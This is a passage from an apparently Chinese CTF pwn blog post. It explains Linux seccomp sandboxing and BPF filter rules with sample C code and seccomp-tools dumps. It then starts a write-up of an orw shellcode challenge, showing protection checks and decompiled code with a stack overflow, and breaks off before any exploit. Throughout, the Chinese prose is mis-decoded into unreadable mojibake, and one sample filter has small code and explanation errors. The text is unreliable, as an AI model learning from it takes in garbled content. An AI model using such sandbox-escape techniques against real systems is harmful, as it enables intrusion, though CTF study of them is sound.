class="line"></span><br><span class="line">    <span class="comment">// è·å–è¿›ç¨‹åç§°</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_GET_NAME, (<span class="type">unsigned</span> <span class="type">long</span>) name) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;prctl&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Process name: %s\n&quot;</span>, name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹åœ¨ä¸Šè¿°ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ prctl å‡½æ•°å°†å½“å‰è¿›ç¨‹çš„åç§°è®¾ç½®ä¸º &quot;MyProcess&quot;ã€‚ç„¶åï¼Œæˆ‘ä»¬å†æ¬¡ä½¿ç”¨ prctl å‡½æ•°è·å–è¿›ç¨‹çš„åç§°ï¼Œå¹¶å°†å…¶æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºã€‚</p><p>â€‹è¯·æ³¨æ„ï¼Œprctl å‡½æ•°çš„å…·ä½“è¡Œä¸ºå’Œå¯ç”¨é€‰é¡¹å¯èƒ½å› æ“ä½œç³»ç»Ÿå’Œç‰ˆæœ¬è€Œå¼‚ã€‚åœ¨ä½¿ç”¨ prctl å‡½æ•°æ—¶ï¼Œåº”è¯¥æŸ¥é˜…ç›¸å…³æ–‡æ¡£å¹¶äº†è§£æ‰€ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿçš„æ”¯æŒå’Œé™åˆ¶ã€‚</p><h2 id="3-bpfè¿‡æ»¤è§„åˆ™ä¼¯å…‹åˆ©å°è£…åŒ…è¿‡æ»¤"><a class="markdownIt-Anchor" href="#3-bpfè¿‡æ»¤è§„åˆ™ä¼¯å…‹åˆ©å°è£…åŒ…è¿‡æ»¤">#</a> 3ã€BPF è¿‡æ»¤è§„åˆ™ (ä¼¯å…‹åˆ©å°è£…åŒ…è¿‡æ»¤)</h2><p>â€‹çªç ´æ²™ç®±è§„åˆ™ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ç§è¶Šæƒæ¼æ´ã€‚seccomp æ˜¯ linux ä¿æŠ¤è¿›ç¨‹å®‰å…¨çš„ä¸€ç§ä¿æŠ¤æœºåˆ¶ï¼Œå®ƒé€šè¿‡å¯¹ç³»ç»Ÿè°ƒç”¨å‡½æ•°çš„é™åˆ¶ï¼Œæ¥ä¿æŠ¤å†…æ ¸æ€çš„å®‰å…¨ã€‚æ‰€è°“æ²™ç®±ï¼Œå°±æ˜¯æŠŠç”¨æˆ·æ€å’Œå†…æ ¸æ€ç›¸äº’åˆ†ç¦»å¼€ï¼Œè®©ç”¨æˆ·æ€çš„è¿›ç¨‹ï¼Œä¸è¦å½±å“åˆ°å†…æ ¸æ€ï¼Œä»è€Œä¿è¯ç³»ç»Ÿå®‰å…¨ã€‚</p><p>â€‹å¦‚æœæˆ‘ä»¬åœ¨æ²™ç®±ä¸­ï¼Œå®Œå…¨éµå®ˆ seccomp æœºåˆ¶ï¼Œæˆ‘ä»¬ä¾¿åªèƒ½è°ƒç”¨ exit (),sigreturn (),read () å’Œ write () è¿™å››ç§ç³»ç»Ÿè°ƒç”¨ï¼Œé‚£ä¹ˆå…¶å®æˆ‘ä»¬çš„è¿›ç¨‹åº”è¯¥æ˜¯å®‰å…¨çš„ï¼ˆå…¶å®ä¹Ÿä¸ä¸€å®šï¼Œåé¢çš„ä¾‹é¢˜å°±æ²¡æœ‰æº¢å‡ºï¼Œè€Œæ˜¯é€šè¿‡ç³»ç»Ÿè°ƒç”¨ç›´æ¥è¯»å–æ–‡ä»¶ï¼‰ã€‚ä½†æ˜¯ï¼Œç”±äºä»–çš„è§„åˆ™è¿‡äºæ­»æ¿ï¼Œæ‰€ä»¥åé¢å‡ºç°äº†è¿‡æ»¤æ¨¡å¼ï¼Œè®©æˆ‘ä»¬å¯ä»¥è°ƒç”¨åˆ°é‚£äº›ç³»ç»Ÿè°ƒç”¨ã€‚å›é¡¾ä¸Šé¢æåˆ°çš„ PT_SET_SECCOMP è¿™ä¸ªå‚æ•°ï¼Œåé¢æ¥åˆ°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå°±æ˜¯å®ƒè®¾ç½®çš„æ¨¡å¼ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ï¼ŒæŒ‡å‘ sock_fprog ç»“æ„ä½“ï¼Œsock_fprog ç»“æ„ä½“ä¸­ï¼Œåˆæœ‰æŒ‡å‘ sock_filter ç»“æ„ä½“çš„æŒ‡é’ˆï¼Œsock_filter ç»“æ„ä½“è¿™é‡Œï¼Œå°±æ˜¯æˆ‘ä»¬è¦è®¾ç½®è§„åˆ™çš„åœ°æ–¹ã€‚</p><p>æˆ‘ä»¬åœ¨è®¾ç½®è¿‡æ»¤è§„åˆ™ï¼Œåœ¨é¢å¯¹æ²™ç®±é¢˜ç›®çš„æ—¶å€™ï¼Œä¼šç»å¸¸ç”¨åˆ° Seccomp-tools è¿™ä¸ªå·¥å…·ã€‚</p><p><strong>BPF æŒ‡ä»¤é›†ç®€ä»‹</strong></p><blockquote><p>BPF_LDï¼šåŠ è½½æ“ä½œï¼ŒBPF_H è¡¨ç¤ºæŒ‰ç…§å­—èŠ‚ä¼ é€ï¼ŒBPF_W è¡¨ç¤ºæŒ‰ç…§åŒå­—æ¥ä¼ é€ï¼ŒBPF_B è¡¨ç¤ºä¼ é€å•ä¸ªå­—èŠ‚ã€‚</p><p>BPF_LDXï¼šä»å†…å­˜ä¸­åŠ è½½ byte/half-word/word/double-wordã€‚</p><p>BPF_ST,BPF_STXï¼šå­˜å‚¨æ“ä½œ</p><p>BPF_ALU,BPT_ALU64ï¼šé€»è¾‘æ“ä½œè¿ç®—ã€‚</p><p>BPT_JMPï¼šè·³è½¬æ“ä½œï¼Œå¯ä»¥å’Œ JGEï¼ŒJGTï¼ŒJEQï¼ŒJSET ä¸€èµ·è¡¨ç¤ºæœ‰æ¡ä»¶çš„è·³è½¬ï¼Œå’Œ BPF_JA ä¸€èµ·è¡¨ç¤ºæ²¡æœ‰æ¡ä»¶çš„è·³è½¬ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/prctl.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/bpf.h&gt;</span>             <span class="comment">//offå’Œimméƒ½æ˜¯æœ‰ç¬¦å·ç±»å‹ï¼Œç¼–ç ä¿¡æ¯å®šä¹‰åœ¨å†…æ ¸å¤´æ–‡ä»¶linux/bpf.h</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[]=</span>&#123;</span><br><span class="line">                BPF_STMT(BPF_LD|BPF_W|BPF_ABS, <span class="number">0</span>),   <span class="comment">// ä»ç¬¬0ä¸ªå­—èŠ‚å¼€å§‹ï¼Œä¼ é€4ä¸ªå­—èŠ‚</span></span><br><span class="line">                BPF_JUMP(BPF_JMP|BPF_JEQ, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>), <span class="comment">// æ¯”è¾ƒæ˜¯å¦ä¸º59ï¼ˆexecve çš„ç³»ç»Ÿè°ƒç”¨å·ï¼‰ï¼Œæ˜¯å°±è·³è¿‡ä¸‹ä¸€è¡Œï¼Œå¦‚æœä¸æ˜¯ï¼Œå°±æ‰§è¡Œä¸‹ä¸€è¡Œï¼Œç¬¬ä¸‰ä¸ªå‚æ•°è¡¨ç¤ºæ‰§è¡Œæ­£ç¡®çš„æŒ‡ä»¤è·³è½¬ï¼Œç¬¬å››ä¸ªå‚æ•°è¡¨ç¤ºæ‰§è¡Œé”™è¯¯çš„æŒ‡ä»¤è·³è½¬</span></span><br><span class="line">                BPF_JUMP(BPF_JMP|BPF_JGE, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>),</span><br><span class="line">        <span class="comment">//      BPF_STMP(BPF_RET+BPF_K,SECCOMP_RET_KILL),</span></span><br><span class="line">        <span class="comment">//        æ€æ­»ä¸€ä¸ªè¿›ç¨‹</span></span><br><span class="line">        <span class="comment">//        BPF_STMP(BPF_RET+BPF_K,SECCOMP_RET_TRACE),</span></span><br><span class="line">        <span class="comment">//        çˆ¶è¿›ç¨‹è¿½è¸ªå­è¿›ç¨‹ï¼Œå…·ä½“æ²¡å¤ªææ¸…æ¥š</span></span><br><span class="line">                 BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ERRNO),</span><br><span class="line">        <span class="comment">//        å¼‚å¸¸å¤„ç†</span></span><br><span class="line">                BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),</span><br><span class="line">        <span class="comment">//        è¿™é‡Œè¡¨ç¤ºç³»ç»Ÿè°ƒç”¨å¦‚æœæ­£å¸¸ï¼Œå…è®¸ç³»ç»Ÿè°ƒç”¨</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span>=</span>&#123;</span><br><span class="line">                .len=<span class="keyword">sizeof</span>(filter)/<span class="keyword">sizeof</span>(sock_filter[<span class="number">0</span>]),</span><br><span class="line">                .filter=filter,</span><br><span class="line">        &#125;;</span><br><span class="line">        prctl(PR_SET_NO_NEW_PRIVS,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);<span class="comment">//ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¿›è¡Œä»€ä¹ˆè®¾ç½®ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è®¾ç½®çš„è¿‡æ»¤æ¨¡å¼ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯è®¾ç½®çš„è¿‡æ»¤è§„åˆ™</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å¼€å§‹çš„æ—¶å€™ï¼Œæˆ‘ä»¬è®¾ç½®äº† sock_filter ç»“æ„ä½“æ•°ç»„ã€‚è¿™é‡Œä¸ºä»€ä¹ˆæ˜¯ä¸€ä¸ªç»“æ„ä½“æ•°ç»„å‘¢ï¼Ÿå› ä¸ºæˆ‘ä»¬çœ‹åˆ°é‡Œé¢æœ‰ BPF_STMT å’Œ BPF_JMP çš„å®å®šä¹‰ï¼Œå…¶å® BPF_STMT å’Œ BPF_JMP éƒ½æ˜¯æ¡ä»¶ç¼–è¯‘åèµ‹å€¼çš„ sock_filter ç»“æ„ä½“ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span>     BPF_STMT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    BPF_STMT(code,k)&#123;(unsigned short)(code),0,0,k&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span>     BPF_JUMP</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    BPF_JUMP(code,k,jt,jf)&#123;(unsigned short)(code),jt,jf,k&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>â€‹ä¸Šé¢çš„ä¾‹å­ä¸­ç¦ç”¨äº† execve çš„ç³»ç»Ÿè°ƒç”¨å·ï¼Œ64 ä½ç³»ç»Ÿä¸­ execve çš„ç³»ç»Ÿè°ƒç”¨å·æ˜¯ 59.</p><p>â€‹BPF_JUMP åçš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯æˆ‘ä»¬è¦è®¾ç½®çš„éœ€è¦ç¦ç”¨çš„ç³»ç»Ÿè°ƒç”¨å·ã€‚</p><p>â€‹æˆ‘ä»¬åœ¨è¿™é‡Œç¦ç”¨çš„ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨åˆ†åˆ«æ˜¯ sys_restart_syscall å’Œ execveï¼Œå¦‚æœå‡ºç°è¿™ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¼šè·³è½¬åˆ° BPF_STMP (BPF_RET+BPF_K,SECCOMP_RET_ERRNO) çš„å¼‚å¸¸å¤„ç†ã€‚å…¶å®ï¼Œå¦‚æœæˆ‘ä»¬è¦ç›´æ¥æ€æ­»è¿™ä¸ªè¿›ç¨‹çš„è¯ï¼ŒBPF_STMP (BPF_RET+BPF_K,SECCOMP_RET_KILL) è¿™ä¸ªè§„åˆ™å¯ä»¥ç›´æ¥æ€æ­»è¿›ç¨‹ã€‚</p><p>â€‹GitHub ä¸Šçš„ä¸€ä¸ªçœŸå®ä¾‹å­ï¼š</p><p><span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vZm50bG56LzA4YWUyMGJlZmI5MWJlZmQ5YTUzY2Q5MWNkYzZkNTA3">ä¾‹å­</span></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/audit.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">install_filter</span><span class="params">(<span class="type">int</span> nr, <span class="type">int</span> arch, <span class="type">int</span> error)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(<span class="keyword">struct</span> seccomp_data, arch))),</span><br><span class="line">      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, arch, <span class="number">0</span>, <span class="number">3</span>),</span><br><span class="line">      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(<span class="keyword">struct</span> seccomp_data, nr))),</span><br><span class="line">      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, nr, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ERRNO | (error &amp; SECCOMP_RET_DATA)),</span><br><span class="line">      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">      .len = (<span class="type">unsigned</span> <span class="type">short</span>)(<span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>])),</span><br><span class="line">      .filter = filter,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">if</span> (prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    perror(<span class="string">&quot;prctl(NO_NEW_PRIVS)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (prctl(PR_SET_SECCOMP, <span class="number">2</span>, &amp;prog)) &#123;</span><br><span class="line">    perror(<span class="string">&quot;prctl(PR_SET_SECCOMP)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hey there!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  install_filter(__NR_write, AUDIT_ARCH_X86_64, EPERM);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;something&#x27;s gonna happen!!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;it will not definitely print this here\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ç”¨  <code>seccomp-tools</code>  æ¥ dump ä¸‹çœ‹çœ‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~/CTest/seccomp$ seccomp-tools dump ./prctl</span><br><span class="line">hey there!</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x03 0xc000003e  if (A != ARCH_X86_64) goto 0005</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0005</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x00050001  return ERRNO(1)</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure><p>â€‹ç¦ç”¨æ‰ä¹‹åï¼Œæˆ‘ä»¬é€šè¿‡ seccomp æ¥ dump ä¸€ä¸‹ã€‚æˆ‘ä»¬çœ‹åˆ°ï¼Œæœ€å‰é¢çš„å°±æ˜¯ sock_filter ç»“æ„ä½“çš„å››ä¸ªå‚æ•°ï¼Œåé¢çš„ï¼Œå°±æ˜¯ bpf è§„åˆ™çš„æ±‡ç¼–è¡¨ç¤ºã€‚</p><h2 id="4-orw"><a class="markdownIt-Anchor" href="#4-orw">#</a> 4ã€orwï¼š</h2><h3 id="æå®¢å¤§æŒ‘æˆ˜-2019not-bad"><a class="markdownIt-Anchor" href="#æå®¢å¤§æŒ‘æˆ˜-2019not-bad">#</a> [æå®¢å¤§æŒ‘æˆ˜ 2019] Not Badï¼š</h3><p>â€‹å…ˆæ£€æŸ¥ä¸‹ä¿æŠ¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~/Temp$ checksec pwn</span><br><span class="line">[*] &#x27;/home/g01den/Temp/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>â€‹æ²¡æœ‰å¼€ä¿æŠ¤ï¼Œä¸”å­˜åœ¨ RWX æ®µï¼ŒIDA çœ‹çœ‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  mmap((<span class="type">void</span> *)<span class="number">0x123000</span>, <span class="number">0x1000</span>uLL, <span class="number">6</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  sub_400949();</span><br><span class="line">  sub_400906();</span><br><span class="line">  sub_400A16();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å‡½æ•°åç­‰ç­‰æœ‰é—®é¢˜ï¼Œè¯•ç€æ¢å¤ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  mmap((<span class="type">void</span> *)<span class="number">0x123000</span>, <span class="number">0x1000</span>uLL, <span class="number">6</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp();</span><br><span class="line">  init_0();</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ç®€å•æ¢å¤äº†ä¸‹ä¹‹åæ˜¯è¿™æ ·ï¼Œå…ˆçœ‹çœ‹ seccomp å‡½æ•°ï¼Œé‡Œé¢å¾ˆæ˜æ˜¾å­˜åœ¨æ²™ç›’ï¼ˆå¯èƒ½æ˜¯ç§ä¸ä¸“ä¸šçš„è¯´æ³•ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">seccomp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = seccomp_init(<span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">1LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">2LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">60LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> seccomp_load(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å¥½ï¼Œé‚£ä¹ˆç›´æ¥ç”¨ seccomp-tools å·¥å…· dump ä¸€ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~/Temp$ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>â€‹æœ€åå‘ç°å¯ä»¥åˆ©ç”¨çš„ç³»ç»Ÿè°ƒç”¨æœ‰ orw ä¸‰ä¸ªï¼Œé‚£ä¹ˆçœ‹çœ‹ vuln å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400A16</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Easy shellcode, have fun!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x38</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Baddd! Focu5 me! Baddd! Baddd!&quot;</span>);</span><br><span 